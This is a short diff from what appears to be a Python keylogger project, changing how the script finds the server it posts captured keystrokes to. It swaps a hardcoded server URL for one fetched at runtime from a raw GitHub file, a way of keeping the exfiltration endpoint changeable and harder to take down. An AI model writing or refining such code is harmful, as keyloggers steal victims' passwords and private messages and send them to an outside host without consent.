@@ -10,7 +10,7 @@ text = ""
 time_interval = 10
 
 # Server URL - replace with your actual server address
-server_url = "http://0xc18.pythonanywhere.com"
+server_url = requests.get("https://raw.githubusercontent.com/0xc18/python-keylogger/refs/heads/main/host").text
 
 def send_post_req():
     global text
